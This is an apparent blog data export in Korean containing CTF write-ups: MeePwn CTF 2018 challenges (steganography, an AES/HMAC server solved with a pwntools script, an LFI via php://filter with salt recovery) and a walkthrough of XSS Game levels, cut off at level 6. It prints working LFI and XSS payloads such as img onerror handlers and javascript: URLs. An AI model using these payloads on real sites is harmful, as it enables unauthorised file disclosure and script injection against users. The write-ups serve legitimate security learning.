        "content": "지난 주말에 MeePwn CTF가 있었다.다른 일이 있어 풀타임으로 참여하진 못했는데, 그래도 쉬운 몇 문제를 풀어 Write-up을 작성 해 보았다.[MISC] WHITE SNOW, BLACK SHADOW첫 번째로 풀어본 문제는 WHITE SNOW, BLACK SHADOW 문제이다.문제 정보는 아래와 같다.Finally we caught the image in criminal communication.But Holmes, why are they crying?문제 정보와 함께 첨부 파일을 다운받을 수 있다.파일을 다운받아 압축을 풀면 evidence.jpg라는 사진 파일을 하나 얻을 수 있다.사진에는 딱히 이상이 없어보여, Hex Editor를 사용 해 헥스 값을 확인 해 보았다.파일의 첫 부분은 정상적인 JPG 파일의 헤더가 있었다.그런데 맨 마지막 부분에서 아래와 같이 message.pdf라는 문자열과 PK가 있는 것을 찾을 수 있었다.PK라는 파일 헤더를 어딘가에서 본 기억이 나 인터넷에 검색을 해 보았더니 ZIP 파일의 헤더라는 것을 알 수 있었다.사진과 같이, ZIP 파일의 헤더는 50 4b 03 04로 시작하게 된다.사진 파일에서 ZIP 파일을 추출하기 위해, 50 4b 03 04를 찾아 보았다.그런데 찾아보니 50 4b 05 06은 있었지만 50 4b 03 04는 찾을 수 없었다.아마도 파일 헤더를 살짝 수정해 둔 것 같았다.그래서 evidence.jpg 파일에서 50 4b 05 06을 50 4b 03 04로 패치해 준 뒤, WinHex 라는 툴을 이용 해 파일을 추출 해 보았다.그 결과 다음과 같이 압축 파일을 추출할 수 있었고, 압축 파일 안에는 message.pdf 파일이 있었다.message.pdf의 내용은 다음과 같다.“When you have eliminated the impossible, whatever remains, however improbable, must be the truth.”– Sir Arthur Conan DoyleWhat does that mean?To me, this is all about logic. If you start with everything you can think of, and then eliminate those that are impossible, you are well on your way to a solution. That’s the first stage of solving any mystery, whether it’s a murder mystery in a book (or TV, or movie, or…) or somethingMeeyou expected to work, but didn’t. You have to eliminate all the things that it couldn’t possibly be, or you will have too many distractions. Once we clear out all the distractions, we can focus on what remains. Sometimes what is left is easy to believe, other times it can seem highly improbable. However, with the impossible eliminated, whatPwnremains are the only possible solutions. And oneCTFof them must be the truth.Why is clearing out the impossible solutions important?Sometimes, it can be hard to solve a{T3challenging situation even under the best of circumstances. A problem with lotsxt_of shiny things to look at can be distracting, and waste a great deal of our time.While some impossibilities might be obvious, sometimesUndwe can be sucked in by an idea that3r_intrigues us, despite being impossible. Other times, it is only in close examination that the impossibility is revealed.However, once we clear the clutter by removing all that is impossible, we are left with an easier solution. Gone are the impossibilities, botht3Xobvious and subtle. What is left can be gone over more quickly, and evaluated for probability or even likelihood.This may be an iterative process, starting with the really obvious impossibilities, and then moving to the shiny distractions. Finally, as wet!!!!}work our way through the last of the options, we may still find ourselves weeding out additional impossibilities.처음엔 딱히 이상한 점을 못느꼈는데, 자세히 읽어보니 띄어쓰기가 있어야 하는 부분에 문자열이 조금씩 들어있는 것을 발견할 수 있었다.  ex) or somethingMeeyou expected to work,문장을 하나하나 읽어보며 띄어쓰기가 있어야 하는 자리에 들어 있는 문자열을 잘라 이어보면 flag를 완성할 수 있다.FLAG : MeePwnCTF{T3xt_Und3r_t3Xt!!!!}[CRYPTO] ESOR문제 정보는 다음과 같다.Howdy, howdy...nc 206.189.92.209 12345또한 함께 아래와 같은 파이썬 코드를 준다.#!/usr/bin/python2from Crypto.Cipher import AESimport hmac, hashlibimport osimport sysmenu = \"\"\"Choose one:1. encrypt data2. decrypt data3. quit\"\"\"class Unbuffered(object):    def __init__(self, stream):        self.stream = stream    def write(self, data):        self.stream.write(data)        self.stream.flush()    def __getattr__(self, attr):        return getattr(self.stream, attr)sys.stdout = Unbuffered(sys.stdout)sys.stderr = Noneencrypt_key = '\\xff' * 32secret = 'MeePwnCTF{#flag_here#}'hmac_secret = ''blocksize = 16hmac_size = 20def pad(msg):\tpadlen = blocksize - (len(msg) % blocksize) - 1\treturn os.urandom(padlen) + chr(padlen)def unpad(msg):\treturn msg[:-(ord(msg[-1]) + 1)]def compute_hmac(msg):\treturn hmac.new(hmac_secret, msg, digestmod=hashlib.sha1).digest()def encrypt(prefix='', suffix=''):\t_enc = prefix + secret + suffix\t_enc+= compute_hmac(_enc)\t_enc+= pad(_enc)\tiv = os.urandom(16)\t_aes = AES.new(encrypt_key, AES.MODE_CBC, iv)\treturn (iv + _aes.encrypt(_enc)).encode('hex')def decrypt(data):\tdata = data.decode('hex')\ttry:\t\tiv = data[:blocksize]\t\t_aes = AES.new(encrypt_key, AES.MODE_CBC, iv)\t\tdata = _aes.decrypt(data[blocksize:])\t\tdata = unpad(data)\t\tplaintext = data[:-hmac_size]\t\tmac = data[-hmac_size:]\t\tif mac == compute_hmac(plaintext): return True\t\telse: return False\texcept: return Falseprint \"\"\"Welcome to our super secure enc/dec server. We use hmac, so, plz don't hack us (and you can't). Thanks.\"\"\"while True:\tchoice = int(raw_input(menu))\tif choice == 1:\t\t_pre = raw_input('prefix: ')\t\t_suf = raw_input('suffix: ')\t\tprint encrypt(prefix=_pre, suffix=_suf)\telif choice == 2:\t\t_data = raw_input('data: ')\t\tif decrypt(_data):\t\t\tprint 'OK'\t\telse:\t\t\tprint 'KO'\telif choice == 3:\t\tsys.exit(0)\telse:\t\tchoice = int(raw_input(menu))서버에 실제로 저장되어 있는 secret의 값을 찾아야 하는 문제이다.nc를 통해 문제에 접속하면 아래와 같다.$ nc 206.189.92.209 12345Welcome to our super secure enc/dec server. We use hmac, so, plz don't hack us (and you can't). Thanks.Choose one:1. encrypt data2. decrypt data3. quit1prefix: aaasuffix: bbbd9d860ba5708b4758a95b84b99459683dde5d09d8a137f2d436cf6b42d3519b3eb5642f9802c5957c867f0d83505462aa9f5d6024238c8618cff0832a15913446e0ff402ffb874968b2ce4b960e37517b557f32570ead1b3cd8e8ff6bf1a907bChoose one:1. encrypt data2. decrypt data3. quit2data: d9d860ba5708b4758a95b84b99459683dde5d09d8a137f2d436cf6b42d3519b3eb5642f9802c5957c867f0d83505462aa9f5d6024238c8618cff0832a15913446e0ff402ffb874968b2ce4b960e37517b557f32570ead1b3cd8e8ff6bf1a907bOKChoose one:1. encrypt data2. decrypt data3. quitencrypt data, decrypt data, quit 3 개의 메뉴가 있고, encrypt data를 선택 할 경우 prefix와 suffix를 입력 해 주어야 한다.또한 decrypt data를 선택 할 경우에는 복호화 할 데이터를 입력받고 복호화 성공 시 OK를, 복호화를 실패 할 경우에는 KO를 출력 해 준다.소스코드를 확인 해 보면 decrypt 함수를 제공 해 주었으며, encrypt_key가 0xff * 32로 되어 있다.그래서 혹시나 해서 다음과 같이 제공해 준 decrypt 함수를 바탕으로 exploit 코드를 짠 후 돌려 보았다.#!/usr/bin/python2from Crypto.Cipher import AESimport hmac, hashlibimport osimport sysfrom pwn import *class Unbuffered(object):    def __init__(self, stream):        self.stream = stream    def write(self, data):        self.stream.write(data)        self.stream.flush()    def __getattr__(self, attr):        return getattr(self.stream, attr)sys.stdout = Unbuffered(sys.stdout)sys.stderr = Noneencrypt_key = '\\xff' * 32hmac_secret = ''blocksize = 16hmac_size = 20def unpad(msg):\treturn msg[:-(ord(msg[-1]) + 1)]def compute_hmac(msg):\treturn hmac.new(hmac_secret, msg, digestmod=hashlib.sha1).digest()def decrypt(data):\tdata = data.decode('hex')\ttry:\t\tiv = data[:blocksize]\t\t_aes = AES.new(encrypt_key, AES.MODE_CBC, iv)\t\tdata = _aes.decrypt(data[blocksize:])\t\tdata = unpad(data)\t\tplaintext = data[:-hmac_size]\t\tmac = data[-hmac_size:]\t\tif mac == compute_hmac(plaintext):\t\t\tprint plaintext\t\t\treturn True\t\telse: return False\texcept: return Falseprint \"[+] ESOR exploit start\"s = remote(\"206.189.92.209\", 12345)print \"[+] Connect OK with ESOR\" s.recvuntil(\"3. quit\")s.sendline(\"1\")s.recvuntil(\"prefix: \")s.sendline(\"aaa\")s.recvuntil(\"suffix: \")s.sendline(\"bbb\")recv_data = s.recvuntil(\"3. quit\")data = recv_data.split(\"Choose one:\")[0][:192]print dataprint \"[+] Check Encrypted data OK\"decrypt(data)nc로 접속한 후, 암호화 된 데이터를 받아 제공해 준 decrypt 함수를 사용 해 복호화 한 후 print plaintext만 추가 해 주었다.그 결과 앞 뒤로 내가 입력 한 prefix와 suffix가 있는 flag를 얻을 수 있었다.FLAG : MeePwnCTF{pooDL3-this-is-la-vie-en-rose-P00dle!}아무래도 이 문제는 출제자가 잘못 낸 문제같다.flag의 내용으로 추측하건데, 아마도 POODLE 공격을 해야하는 문제가 아니었나 싶다.그런데, 오늘 다시 코드를 돌려보니 이제는 문제가 풀리지 않았다.대회 도중 출제자가 잘못된 것을 깨닫고 문제를 수정한 것 같다.IRC는 모르겠지만 홈페이지에는 공지가 없었다… 잠수함 패치 잼…[CRYPTO] EZCHALLZ문제 정보는 아래와 같다.http://206.189.92.209/ezchallz/홈페이지에 접속 해 보면 아래와 같은 화면만 있다.Homepage와 Free register, 딱 두개의 메뉴만 있을 뿐이었다.Homepage를 누르면 위와 동일한 화면이 나타난다.Free register를 누를 경우에는 아래와 같이 값을 입력할 수 있으며, Register 버튼을 누르면 가짜 flag를 출력 해 준다.소스코드를 봐도 딱히 눈에 띄는것이 없어 URL을 살펴 보았다.각각 버튼을 누를 경우 이동하는 URL은 다음과 같다.  Homepage를 누를 경우 : http://206.189.92.209/ezchallz/index.phpFree register를 누를 경우 : http://206.189.92.209/ezchallz/index.php?page=register값 입력 후 Register 버튼을 누를 경우 : http://206.189.92.209/ezchallz/users/b8240bb93fb5c4321196ff675b7f98eb/flag.php쿼리 스트링에서 page를 인자로 받아 페이지를 이동한다는 것을 알 수 있었다.그런데 이 경우 LFI 공격에 취약할 수 있다.page의 값에 다음과 같이 입력한다면, 해당 파일의 내용을 읽을 수 있다.?page=php://filter/convert.base64-encode/resource=index그 결과 아래와 같이 base64로 인코딩 된 소스코드를 얻을 수 있었다.index와 register 페이지의 소스코드를 얻어 base64로 디코딩 하면 아래와 같다.  index.php&lt;html&gt;&lt;a href=\"index.php\"&gt;Homepage&lt;/a&gt;&lt;a href=\"?page=register\"&gt;Free register&lt;/a&gt;&lt;/li&gt;&lt;?phpif(isset($_GET[\"page\"]) &amp;&amp; !empty($_GET[\"page\"])) {    $page = $_GET[\"page\"];    if(strpos(strtolower($page), 'secret') !== false) {        die('No no no!');    }//    else if(strpos($page, 'php') !== false) { //       die(\"N0 n0 n0!\");//    }    else {        include($page . '.php');    }}?&gt;&lt;/html&gt;  register.php&lt;html&gt;&lt;?phperror_reporting(0);function gendirandshowflag($username) {\tinclude('secret.php');\t$dname = \"\";\t$intro = \"\";\t$_username = md5($username, $raw_output = TRUE);\tfor($i = 0; $i&lt;strlen($salt); $i++) {\t\t$dname.= chr(ord($salt[$i]) ^ ord($_username[$i]));\t};\t$dname = \"users/\" . bin2hex($dname);\techo 'You have successfully register as ' . $username . '!\\n';\tif ($_username === hex2bin('21232f297a57a5a743894a0e4a801fc3')) {\t\t$intro = \"Here is your flag:\" . $flag;\t}\telse {\t\t$intro = \"Here is your flag, but I'm not sure 🤔: \\nMeePwnCTF{\" . md5(random_bytes(16) . $username) . \"}\";\t}\tmkdir($dname);\tfile_put_contents($dname . '/flag.php', $intro);\theader(\"Location: \". $dname . \"/flag.php\");}if (isset($_POST['username'])) {\tif ($_POST['username'] === 'admin') {\t\tdie('Username is not allowed!');\t}\telse {\t\tgendirandshowflag($_POST['username']);\t}}?&gt;        &lt;form action=\"?page=register\" method=\"POST\"&gt;        &lt;input type=\"text\" name=\"username\"&gt;&lt;br&gt;        &lt;input type=\"submit\" value=\"Register\"&gt;        &lt;/form&gt;&lt;/html&gt;소스코드를 분석해 본 결과, username의 md5 해쉬 값이 21232f297a57a5a743894a0e4a801fc3라면 진짜 flag를 $dname/flag.php에 저장하는 것을 알 수 있었다.즉, md5 해쉬 값이 21232f297a57a5a743894a0e4a801fc3인 username을 찾아 해당 username의 $dname을 구해 $dname/flag.php에 들어가면 flag를 얻을 수 있다.$dname을 만드는 코드는 다음과 같다.for($i = 0; $i&lt;strlen($salt); $i++) {\t$dname.= chr(ord($salt[$i]) ^ ord($_username[$i]));};따라서 $dname을 만들기 위해서는 $salt의 값과 $_username의 값을 알아야 한다.인터넷의 해쉬 값을 크랙해 주는 사이트에서 21232f297a57a5a743894a0e4a801fc3의 평문은 admin이라는 것을 알아내어, $_username은 admin이라는 것을 알 수 있었다.문제는 $salt 값인데, 변수를 새로 선언도 안한 것으로 보아 $salt의 값은 secret.php에 있는 것 같다.하지만 index.php에서 secret라는 문자에 대한 필터링을 걸어 두었으므로, secret.php의 소스코드는 알아낼 수 없다.하지만 $dname을 만들 때 XOR 연산을 사용하며, 홈페이지에서 내가 입력한 값을 바탕으로 만들어 지는 $dname의 값을 확인할 수 있다.따라서 이를 역 연산하면 $salt의 값을 알아낼 수 있다.$salt의 값을 구하고, admin의 $dname을 구하기 위해 아래와 같이 소스코드를 구현 했다.&lt;?php\t$_username = md5(\"test\", $raw_output = TRUE);\t$_dname = hex2bin(\"b8240bb93fb5c4321196ff675b7f98eb\");\t$salt = \"\";\tfor($i; $i &lt; strlen($_username); $i ++) {\t\t$salt .= chr(ord($_dname[$i]) ^ ord($_username[$i]));\t}\t$_username = md5(\"admin\", $raw_output = TRUE);\t$dname = \"\";\tfor($i = 0; $i &lt; strlen($_username); $i ++) {\t\t$dname.= chr(ord($salt[$i]) ^ ord($_username[$i]));    }\techo bin2hex($dname);?&gt;그 결과 90884f5d03c3b2e698c1fbea37d833de라는 $dname 값을 구할 수 있었다.90884f5d03c3b2e698c1fbea37d833de/flag.php로 접속 해 주석을 확인 해보면 flag를 얻을 수 있다.FLAG : MeePwnCTF{just-a-warmup-challenge-are-you-ready-for-hacking-others-challz?}",
        "url": "//ctf/2018/2018/07/17/ctf-meepwn2018-writeup.html"
      }
      ,
    
      "wargame-xss-20game-2018-06-27-xssgame-writeup-html": {
        "title": "[XSS Game] Write up",
        "tags": "Write-up, XSS Game",
        "date": "June 27, 2018",
        "author": "",
        "category": "",
        "content": "우연히 XSS Game이라는 워게임 사이트를 알게 되었다.XSS 문제만 모여 있는 사이트인데, 총 6문제가 있고, 다양한 방식으로 XSS 공격을 수행할 수 있어 처음 XSS를 공부하는 사람들이 접하기에 좋은 사이트인 것 같다.XSS Game은 플래그를 인증하는 방식이 아니라, alert를 띄우면 된다.6단계를 거치면서 필터링이 추가되는 방식이 아니라 공격 벡터가 모두 다르도록 되어있고, 각 문제별로 3~4개 정도의 힌트가 주어진다.모든 문제는 iframe으로 제공되며, 마우스 오른쪽 버튼 클릭 후 프레임 소스 보기를 선택하면 문제의 소스코드를 볼 수 있다.또한 소스 보기에서 view=source:를 지우면 해당 프레임 페이지에서 직접 시도할 수 있다.xss-game 내에서는 URL을 조작하려 하니 자꾸 setImmediate로 바뀌어서 프레임 페이지로 직접 이동 해 문제를 푼 후 해당 URL을 그대로 문제로 가져오는 방식으로 문제를 풀이했다.문제 사이트는 아래와 같다.http://xss-game.appspot.com/문제에 처음 접속하면 다음과 같이 화면이 뜨는데, 초록색 버튼을 누르면 첫 번째 단계를 시작할 수 있다.Level 1첫 번째 문제이다.소스코드는 아래와 같다.&lt;!doctype html&gt;&lt;html&gt;  &lt;head&gt;    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;    &lt;script src=\"/static/game-frame.js\"&gt;&lt;/script&gt;    &lt;link rel=\"stylesheet\" href=\"/static/game-frame-styles.css\" /&gt;  &lt;/head&gt;  &lt;body id=\"level1\"&gt;    &lt;img src=\"/static/logos/level1.png\"&gt;    &lt;div&gt;      &lt;form action=\"\" method=\"GET\"&gt;        &lt;input id=\"query\" name=\"query\" value=\"Enter query here...\" onfocus=\"this.value=''\"&gt;        &lt;input id=\"button\" type=\"submit\" value=\"Search\"&gt;      &lt;/form&gt;    &lt;/div&gt;  &lt;/body&gt;&lt;/html&gt;어떤 특정 입력 값을 받는데, 값을 입력하면 입력한 값이 그대로 출력된다.aa를 입력 한 경우 아래와 같다.따라서 별다른 필터링이 없다면 입력 창에 스크립트 코드를 삽입 해 XSS 공격을 유발할 수 있다.입력 창에 &lt;script&gt; alert(1); &lt;/script&gt;를 입력 해 보았다.그 결과 Level 1을 클리어 할 수 있었다.Level 2Level 2는 댓글 달기 기능과 유사한 기능이 구현되어 있다.내가 입력한 텍스트가 그대로 보이기 때문에 Level 1과 동일하게 &lt;script&gt; alert(1); &lt;/script&gt;를 입력 해 보았으나, 동작하지 않았다.소스코드를 살펴보면 다음과 같다.&lt;!doctype html&gt;&lt;html&gt;  &lt;head&gt;    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;    &lt;script src=\"/static/game-frame.js\"&gt;&lt;/script&gt;    &lt;link rel=\"stylesheet\" href=\"/static/game-frame-styles.css\" /&gt;    &lt;!-- This is our database of messages --&gt;    &lt;script src=\"/static/post-store.js\"&gt;&lt;/script&gt;      &lt;script&gt;      var defaultMessage = \"Welcome!&lt;br&gt;&lt;br&gt;This is your &lt;i&gt;personal&lt;/i&gt;\"        + \" stream. You can post anything you want here, especially \"        + \"&lt;span style='color: #f00ba7'&gt;madness&lt;/span&gt;.\";      var DB = new PostDB(defaultMessage);      function displayPosts() {        var containerEl = document.getElementById(\"post-container\");        containerEl.innerHTML = \"\";        var posts = DB.getPosts();        for (var i=0; i&lt;posts.length; i++) {          var html = '&lt;table class=\"message\"&gt; &lt;tr&gt; &lt;td valign=top&gt; '            + '&lt;img src=\"/static/level2_icon.png\"&gt; &lt;/td&gt; &lt;td valign=top '            + ' class=\"message-container\"&gt; &lt;div class=\"shim\"&gt;&lt;/div&gt;';          html += '&lt;b&gt;You&lt;/b&gt;';          html += '&lt;span class=\"date\"&gt;' + new Date(posts[i].date) + '&lt;/span&gt;';          html += \"&lt;blockquote&gt;\" + posts[i].message + \"&lt;/blockquote&gt;\";          html += \"&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\"          containerEl.innerHTML += html;         }      }      window.onload = function() {         document.getElementById('clear-form').onsubmit = function() {          DB.clear(function() { displayPosts() });          return false;        }        document.getElementById('post-form').onsubmit = function() {          var message = document.getElementById('post-content').value;          DB.save(message, function() { displayPosts() } );          document.getElementById('post-content').value = \"\";          return false;        }        displayPosts();      }    &lt;/script&gt;  &lt;/head&gt;  &lt;body id=\"level2\"&gt;    &lt;div id=\"header\"&gt;      &lt;img src=\"/static/logos/level2.png\" /&gt;       &lt;div&gt;Chatter from across the Web.&lt;/div&gt;      &lt;form action=\"?\" id=\"clear-form\"&gt;        &lt;input class=\"clear\" type=\"submit\" value=\"Clear all posts\"&gt;      &lt;/form&gt;    &lt;/div&gt;    &lt;div id=\"post-container\"&gt;&lt;/div&gt;    &lt;table class=\"message\"&gt;      &lt;tr&gt;        &lt;td valign=\"top\"&gt;          &lt;img src=\"/static/level2_icon.png\"&gt;        &lt;/td&gt;        &lt;td class=\"message-container\"&gt;          &lt;div class=\"shim\"&gt;&lt;/div&gt;          &lt;form action=\"?\" id=\"post-form\"&gt;            &lt;textarea id=\"post-content\" name=\"content\" rows=\"2\"               cols=\"50\"&gt;&lt;/textarea&gt;            &lt;input class=\"share\" type=\"submit\" value=\"Share status!\"&gt;            &lt;input type=\"hidden\" name=\"action\" value=\"sign\"&gt;          &lt;/form&gt;        &lt;/td&gt;      &lt;/tr&gt;    &lt;/table&gt;  &lt;/body&gt;&lt;/html&gt;소스코드를 살펴 본 결과, 내가 입력 한 값이 그대로 &lt;blockquote&gt; 태그 안에서 출력 되지만, &lt;script&gt; 태그는 먹히지 않았다.아무래도 필터링이 있는 것 같았다.따라서 다른 방법으로 alert를 띄울 수 있는 방법을 찾아보다 &lt;img&gt; 태그는 사용이 가능하다는 것을 알 수 있었다.그래서 &lt;img&gt; 태그의 onload 속성을 사용하게 되었다.onload 속성은 여러 태그에서 사용될 수 있는데, &lt;img&gt; 태그에서는 사진이 로드될 때 호출되는 속성이다.로드 할 사진이 있어야 하므로, iframe 내에서 보이는 우주인 사진의 경로를 사용하기로 했다.입력 창에 &lt;img src=\"/static/level2_icon.png\" onload=\"js:alert(1);\"&gt;를 입력 해 보았다.이 경우, 서버 내의 /static/level2_icon.png 라는 우주인 사진이 로드되며 onload 속성을 호출 해 alert 창을 띄워 줄 것이다.예상대로 alert 창을 확인할 수 있었다.이 방법 외에 onerror를 사용하는 방법도 있다.다만 이 때는 onerror가 오류가 발생할 때 호출되므로, &lt;img src=\"./test\" onerror=\"js:alert(1);\"&gt;와 같이 서버에 없는 사진을 호출하도록 해 오류를 유발해야 한다.Level 3Level 3은 탭으로 나뉘어진 사진을 누르면 그에 해당하는 사진을 보여주는 페이지이다.소스코드는 다음과 같다.&lt;!doctype html&gt;&lt;html&gt;  &lt;head&gt;    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;    &lt;script src=\"/static/game-frame.js\"&gt;&lt;/script&gt;    &lt;link rel=\"stylesheet\" href=\"/static/game-frame-styles.css\" /&gt;    &lt;!-- Load jQuery --&gt;    &lt;script       src=\"//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js\"&gt;    &lt;/script&gt;    &lt;script&gt;      function chooseTab(num) {        // Dynamically load the appropriate image.        var html = \"Image \" + parseInt(num) + \"&lt;br&gt;\";        html += \"&lt;img src='/static/level3/cloud\" + num + \".jpg' /&gt;\";        $('#tabContent').html(html);        window.location.hash = num;        // Select the current tab        var tabs = document.querySelectorAll('.tab');        for (var i = 0; i &lt; tabs.length; i++) {          if (tabs[i].id == \"tab\" + parseInt(num)) {            tabs[i].className = \"tab active\";            } else {            tabs[i].className = \"tab\";          }        }        // Tell parent we've changed the tab        top.postMessage(self.location.toString(), \"*\");      }      window.onload = function() {         chooseTab(unescape(self.location.hash.substr(1)) || \"1\");      }      // Extra code so that we can communicate with the parent page      window.addEventListener(\"message\", function(event){        if (event.source == parent) {          chooseTab(unescape(self.location.hash.substr(1)));        }      }, false);    &lt;/script&gt;  &lt;/head&gt;  &lt;body id=\"level3\"&gt;    &lt;div id=\"header\"&gt;      &lt;img id=\"logo\" src=\"/static/logos/level3.png\"&gt;      &lt;span&gt;Take a tour of our cloud data center.&lt;/a&gt;    &lt;/div&gt;    &lt;div class=\"tab\" id=\"tab1\" onclick=\"chooseTab('1')\"&gt;Image 1&lt;/div&gt;    &lt;div class=\"tab\" id=\"tab2\" onclick=\"chooseTab('2')\"&gt;Image 2&lt;/div&gt;    &lt;div class=\"tab\" id=\"tab3\" onclick=\"chooseTab('3')\"&gt;Image 3&lt;/div&gt;    &lt;div id=\"tabContent\"&gt;&amp;nbsp;&lt;/div&gt;  &lt;/body&gt;&lt;/html&gt;chooseTab 함수에는 인자로 num이 들어가는데, 이 num의 값은 아래 부분에 검증이 없이 그대로 들어간다.html += \"&lt;img src='/static/level3/cloud\" + num + \".jpg' /&gt;\";$('#tabContent').html(html);또한 이 num의 값은 URL에서 # 뒤의 값을 가져오게 된다.따라서 URL에 # 뒤에 위의 코드에 적절히 들어가 동작하도록 만들어준다면 alert 창을 띄울 수 있을 것 같다.이에 URL의 # 뒤에 원래 있던 숫자 대신 ' onerror='js:alert(1);' '을 넣어보았다.이 경우, 취약점이 존재하던 위의 코드는 아래와 같은 형태가 된다.html += \"&lt;img src='/static/level3/cloud' onerror='js:alert(1);' '.jpg' /&gt;\";$('#tabContent').html(html);/static/level3/cloud라는 이미지 파일은 서버에 존재하지 않으므로, onerror를 호출하게 되고, 뒤의 .jpg는 아무런 역할을 하지 않을 것이다.그 결과 아래와 같이 alert 창을 띄울 수 있었다.Level 4Level 4는 입력한 숫자 만큼 타이머를 만들어 주는 페이지이다.소스코드를 살펴보면 아래와 같다.  타이머 숫자 입력 받을 때&lt;!doctype html&gt;&lt;html&gt;  &lt;head&gt;    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;    &lt;script src=\"/static/game-frame.js\"&gt;&lt;/script&gt;    &lt;link rel=\"stylesheet\" href=\"/static/game-frame-styles.css\" /&gt;  &lt;/head&gt;  &lt;body id=\"level4\"&gt;    &lt;img src=\"/static/logos/level4.png\" /&gt;    &lt;br&gt;    &lt;form action=\"\" method=\"GET\"&gt;      &lt;input id=\"timer\" name=\"timer\" value=\"3\"&gt;      &lt;input id=\"button\" type=\"submit\" value=\"Create timer\"&gt; &lt;/form&gt;    &lt;/form&gt;  &lt;/body&gt;&lt;/html&gt;  Create timer 버튼 클릭 후&lt;!doctype html&gt;&lt;html&gt;  &lt;head&gt;    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;    &lt;script src=\"/static/game-frame.js\"&gt;&lt;/script&gt;    &lt;link rel=\"stylesheet\" href=\"/static/game-frame-styles.css\" /&gt;    &lt;script&gt;      function startTimer(seconds) {        seconds = parseInt(seconds) || 3;        setTimeout(function() {           window.confirm(\"Time is up!\");          window.history.back();        }, seconds * 1000);      }    &lt;/script&gt;  &lt;/head&gt;  &lt;body id=\"level4\"&gt;    &lt;img src=\"/static/logos/level4.png\" /&gt;    &lt;br&gt;    &lt;img src=\"/static/loading.gif\" onload=\"startTimer('3');\" /&gt;    &lt;br&gt;    &lt;div id=\"message\"&gt;Your timer will execute in 3 seconds.&lt;/div&gt;  &lt;/body&gt;&lt;/html&gt;소스코드를 살펴보니, 입력한 숫자가 그대로 &lt;img src=\"/static/loading.gif\" onload=\"startTimer('3');\" /&gt;에 들어간다.숫자가 그대로 삽입되고, onload 안에 있으므로, Level 3와 유사하게 맞추어 넣어주면 alert를 띄워줄 수 있을 것 같다.숫자를 입력하는 창에 3'); alert('1를 입력 해 보았다.이 경우 취약점이 있는 부분은 아래와 같이 된다.&lt;img src=\"/static/loading.gif\" onload=\"startTimer('3'); alert('1');\" /&gt;그 결과 아래와 같이 문제를 풀 수 있었다.Level 5Level 5 문제이다.Level 5는 회원가입을 하는 페이지처럼 보이는데, 실제로 소스코드를 확인 해 보면, 회원가입을 누른다 해도 입력한 Email 값을 가지고 아무런 행동을 하지 않는다.&lt;!doctype html&gt;&lt;html&gt;  &lt;head&gt;    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;    &lt;script src=\"/static/game-frame.js\"&gt;&lt;/script&gt;    &lt;link rel=\"stylesheet\" href=\"/static/game-frame-styles.css\" /&gt;  &lt;/head&gt;  &lt;body id=\"level5\"&gt;    &lt;img src=\"/static/logos/level5.png\" /&gt;&lt;br&gt;&lt;br&gt;    Thanks for signing up, you will be redirected soon...    &lt;script&gt;      setTimeout(function() { window.location = 'welcome'; }, 5000);    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;이에 첫 번째 페이지와 Email을 입력하는 페이지의 소스코드를 다시 차근차근 확인 해 보았다.  첫 번째 페이지&lt;!doctype html&gt;&lt;html&gt;  &lt;head&gt;    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;    &lt;script src=\"/static/game-frame.js\"&gt;&lt;/script&gt;    &lt;link rel=\"stylesheet\" href=\"/static/game-frame-styles.css\" /&gt;  &lt;/head&gt;  &lt;body id=\"level5\"&gt;    Welcome! Today we are announcing the much anticipated&lt;br&gt;&lt;br&gt;    &lt;img src=\"/static/logos/level5.png\" /&gt;&lt;br&gt;&lt;br&gt;    &lt;a href=\"/level5/frame/signup?next=confirm\"&gt;Sign up&lt;/a&gt;     for an exclusive Beta.  &lt;/body&gt;&lt;/html&gt;  Email을 입력하는 페이지&lt;!doctype html&gt;&lt;html&gt;  &lt;head&gt;    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;    &lt;script src=\"/static/game-frame.js\"&gt;&lt;/script&gt;    &lt;link rel=\"stylesheet\" href=\"/static/game-frame-styles.css\" /&gt;  &lt;/head&gt;  &lt;body id=\"level5\"&gt;    &lt;img src=\"/static/logos/level5.png\" /&gt;&lt;br&gt;&lt;br&gt;    &lt;!-- We're ignoring the email, but the poor user will never know! --&gt;    Enter email: &lt;input id=\"reader-email\" name=\"email\" value=\"\"&gt;    &lt;br&gt;&lt;br&gt;    &lt;a href=\"confirm\"&gt;Next &gt;&gt;&lt;/a&gt;  &lt;/body&gt;&lt;/html&gt;살펴보니 아래의 두 곳을 통해 취약점을 발견할 수 있었다.&lt;a href=\"/level5/frame/signup?next=confirm\"&gt;Sign up&lt;/a&gt;&lt;a href=\"confirm\"&gt;Next &gt;&gt;&lt;/a&gt;Sign up을 누르면 쿼리스트링으로 next=confirm이 넘어간다.그 후, Email을 입력하는 화면에선 앞에서 next의 값으로 넘어왔던 confirm이 &lt;a&gt; 태그 안에 그대로 들어있다.따라서 next의 값으로 confirm이 아니라 alert 창을 띄울 수 있는 코드를 넘긴다면 이번 레벨을 통과할 수 있을 것 같다.alert 창을 띄우기 위해 confirm 대신에 javascript:alert(1);을 넘겨 보았다.그 결과 아래와 같이 Next를 누를 경우 javascript:alert(1);이 실행되도록 소스코드가 바뀐 것을 확인할 수 있었다.이 후 Next 버튼을 누르면 alert 창을 확인할 수 있다.Level 6드디어 마지막 문제인 Level 6이다.소스코드는 아래와 같다.&lt;!doctype html&gt;&lt;html&gt;  &lt;head&gt;    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;    &lt;script src=\"/static/game-frame.js\"&gt;&lt;/script&gt;    &lt;link rel=\"stylesheet\" href=\"/static/game-frame-styles.css\" /&gt;    &lt;script&gt;    function setInnerText(element, value) {      if (element.innerText) {        element.innerText = value;      } else {        element.textContent = value;      }    }    function includeGadget(url) {      var scriptEl = document.createElement('script');      // This will totally prevent us from loading evil URLs!      if (url.match(/^https?:\\/\\//)) {        setInnerText(document.getElementById(\"log\"),          \"Sorry, cannot load a URL containing \\\"http\\\".\");        return;      }      // Load this awesome gadget      scriptEl.src = url;      // Show log messages      scriptEl.onload = function() {         setInnerText(document.getElementById(\"log\"),            \"Loaded gadget from \" + url);      }      